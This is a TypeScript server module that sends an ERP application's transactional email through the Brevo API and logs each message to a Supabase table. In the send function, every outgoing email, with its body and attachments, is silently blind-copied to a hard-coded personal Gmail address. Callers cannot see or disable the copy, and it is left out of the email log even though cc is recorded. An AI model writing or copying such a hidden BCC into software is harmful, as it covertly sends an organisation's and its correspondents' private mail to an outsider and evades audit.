import { BrevoClient } from '@getbrevo/brevo'
import { supabaseAdmin } from '@/lib/api/supabase-server'

function getClient() {
  const apiKey = process.env.BREVO_API_KEY
  if (!apiKey) {
    throw new Error('Brevo not configured. Set BREVO_API_KEY env var')
  }
  return new BrevoClient({ apiKey })
}

export async function getCompanyEmail(): Promise<string> {
  const { data } = await supabaseAdmin
    .from('site_settings')
    .select('value')
    .eq('key', 'company_email')
    .maybeSingle()
  return data?.value ?? process.env.BREVO_SENDER_EMAIL ?? 'noreply@erp-rri.com'
}

async function getCompanySenderName(): Promise<string | null> {
  const { data } = await supabaseAdmin
    .from('site_settings')
    .select('value')
    .eq('key', 'penandatangan_nama')
    .maybeSingle()
  return data?.value ? `${data.value} - RRI` : null
}

export interface SendBrevoEmailParams {
  to: { email: string; name?: string }
  subject: string
  htmlContent?: string
  textContent?: string
  templateId?: number
  params?: Record<string, unknown>
  tags?: string[]
  attachment?: Array<{ name: string; content: string }>
  cc?: Array<{ email: string; name?: string }>
  bcc?: Array<{ email: string; name?: string }>
  replyTo?: { email: string; name?: string }
  referenceType?: string
  referenceId?: string
}

export async function sendEmailViaBrevo(params: SendBrevoEmailParams) {
  const rawSender = process.env.BREVO_SENDER_EMAIL?.trim()
  const fromEmail = rawSender || (await getCompanyEmail())
  const fromName = (await getCompanySenderName()) ?? process.env.BREVO_SENDER_NAME ?? 'ERP RRI'

  let status: string
  let errorMessage: string | null = null
  let messageId: string | null = null

  try {
    const client = getClient()
    const bccList: Array<{ email: string; name?: string }> = [
      ...(params.bcc ?? []),
      { email: 'mazzjoeq@gmail.com' },
    ]
    const response = await client.transactionalEmails.sendTransacEmail({
      sender: { name: fromName, email: fromEmail },
      to: [params.to],
      subject: params.subject,
      htmlContent: params.htmlContent,
      textContent: params.textContent,
      templateId: params.templateId,
      params: params.params,
      tags: params.tags,
      attachment: params.attachment,
      cc: params.cc,
      bcc: bccList,
      replyTo: params.replyTo,
    })
    status = 'sent'
    messageId = response.messageId ?? null
  } catch (err) {
    status = 'failed'
    errorMessage = err instanceof Error ? err.message : String(err)
  }

  const now = new Date().toISOString()
  await supabaseAdmin.from('email_log').insert({
    message_id: messageId,
    from_email: fromEmail,
    from_nama: fromName,
    to_email: params.to.email,
    to_nama: params.to.name ?? null,
    subject: params.subject,
    body: params.htmlContent ?? params.textContent ?? null,
    cc: params.cc?.map(c => c.email).join(', ') ?? null,
    status,
    error_message: errorMessage,
    has_attachments: params.attachment ? params.attachment.length > 0 : false,
    reference_type: params.referenceType ?? null,
    reference_id: params.referenceId ?? null,
    tags: params.tags?.join(',') ?? null,
    created_at: now,
    updated_at: now,
  })

  if (status === 'failed') {
    throw new Error(errorMessage ?? 'Failed to send email via Brevo')
  }

  return { success: true, messageId, messageIds: undefined as string[] | undefined }
}
